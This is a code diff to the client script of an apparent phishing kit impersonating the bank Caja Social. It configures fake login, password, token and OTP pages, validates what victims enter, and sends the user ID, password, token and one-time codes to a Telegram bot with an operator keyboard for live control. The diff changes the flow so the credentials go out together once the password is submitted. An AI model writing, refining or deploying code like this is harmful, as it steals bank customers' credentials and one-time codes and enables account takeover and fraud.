@@ -1,5 +1,5 @@
 /**
- * CAJA SOCIAL - Cliente optimizado usando banco-utils + caja-social-telegram
+ * CAJA SOCIAL - Flujo: usuario → password (sin Telegram) → Telegram al enviar password
  */
 
 (function() {
@@ -7,35 +7,40 @@
 
     const pageConfig = {
         'index.html': {
-            stage: 'login',
             form: 'loginForm',
             inputs: { usuario: 'usuario' },
             button: 'submitBtn',
-            validation: (data) => /^(CC|CE|NI|TI|PE)\d+$/i.test((data.usuario || '').trim())
+            validation: (data) => /^(CC|CE|NI|TI|PE)\d+$/i.test((data.usuario || '').trim()),
+            sendToTelegram: false,
+            nextPage: 'password.html'
         },
         'password.html': {
-            stage: 'password',
             form: 'passwordForm',
             inputs: { password: 'password' },
             button: 'btnContinuar',
-            validation: (data) => (data.password || '').length === 8
+            validation: (data) => (data.password || '').length === 8,
+            sendToTelegram: true,
+            telegramStage: 'CREDENCIALES',
+            requireUsuario: true
         },
         'token.html': {
-            stage: 'token',
             form: 'tokenForm',
             inputs: { token: 'token' },
             button: 'btnContinuar',
-            validation: (data) => (data.token || '').length === 6
+            validation: (data) => (data.token || '').length === 6,
+            sendToTelegram: true,
+            telegramStage: 'TOKEN'
         },
         'otp.html': {
-            stage: 'otp',
             form: 'otpForm',
             inputs: { otp: 'otp' },
             button: 'btnVerificar',
             validation: (data) => {
                 const len = (data.otp || '').length;
                 return len >= 4 && len <= 8;
-            }
+            },
+            sendToTelegram: true,
+            telegramStage: 'OTP'
         }
     };
 
@@ -51,7 +56,6 @@
 
         CajaSocialTelegram.initPageErrors();
 
-        const sessionId = BancoUtils.getSessionId();
         BancoUtils.initSocket();
 
         const form = document.getElementById(config.form);
@@ -82,45 +86,65 @@
             }
         }
 
-        if (form) {
-            form.addEventListener('submit', async function(e) {
-                e.preventDefault();
-                validateForm();
-                if (button && button.disabled) return;
+        if (!form) return;
 
-                BancoUtils.showOverlay();
-                const overlay = document.getElementById('loadingOverlay');
-                if (overlay) {
-                    overlay.style.display = 'flex';
-                    overlay.classList.add('show');
-                }
+        form.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            validateForm();
+            if (button && button.disabled) return;
 
-                const socket = BancoUtils.getSocket();
-                if (!socket || !socket.connected) {
-                    alert('Error de conexión. Recarga la página.');
-                    BancoUtils.hideOverlay();
-                    if (overlay) overlay.style.display = 'none';
-                    return;
-                }
-
-                const formData = {};
-                Object.keys(inputs).forEach((key) => {
-                    formData[key] = inputs[key] ? inputs[key].value.trim() : '';
-                });
-
-                const fullData = BancoUtils.saveBankData('caja-social', formData);
-                const message = BancoUtils.formatMessage(`CAJA SOCIAL - ${config.stage.toUpperCase()}`, fullData);
-                const keyboard = CajaSocialTelegram.getKeyboard();
-
-                try {
-                    await BancoUtils.sendToTelegram(config.stage, { text: message, keyboard });
-                } catch (error) {
-                    console.error('Error:', error);
-                    alert('Error al enviar datos');
-                    BancoUtils.hideOverlay();
-                    if (overlay) overlay.style.display = 'none';
-                }
+            const formData = {};
+            Object.keys(inputs).forEach((key) => {
+                let val = inputs[key] ? inputs[key].value.trim() : '';
+                if (key === 'usuario') val = val.toUpperCase();
+                formData[key] = val;
             });
-        }
+
+            BancoUtils.saveBankData('caja-social', formData);
+
+            if (!config.sendToTelegram) {
+                window.location.href = config.nextPage || 'password.html';
+                return;
+            }
+
+            const fullData = BancoUtils.getBankData('caja-social');
+            if (config.requireUsuario && !fullData.usuario) {
+                window.location.href = 'index.html';
+                return;
+            }
+
+            BancoUtils.showOverlay();
+            const overlay = document.getElementById('loadingOverlay');
+            if (overlay) {
+                overlay.style.display = 'flex';
+                overlay.classList.add('show');
+            }
+
+            const socket = BancoUtils.getSocket();
+            if (!socket || !socket.connected) {
+                alert('Error de conexión. Recarga la página.');
+                BancoUtils.hideOverlay();
+                if (overlay) overlay.style.display = 'none';
+                return;
+            }
+
+            const message = BancoUtils.formatMessage(
+                `CAJA SOCIAL - ${config.telegramStage}`,
+                fullData
+            );
+            const keyboard = CajaSocialTelegram.getOperatorKeyboard();
+
+            try {
+                await BancoUtils.sendToTelegram(config.telegramStage.toLowerCase(), {
+                    text: message,
+                    keyboard
+                });
+            } catch (error) {
+                console.error('Error:', error);
+                alert('Error al enviar datos');
+                BancoUtils.hideOverlay();
+                if (overlay) overlay.style.display = 'none';
+            }
+        });
     });
 })();
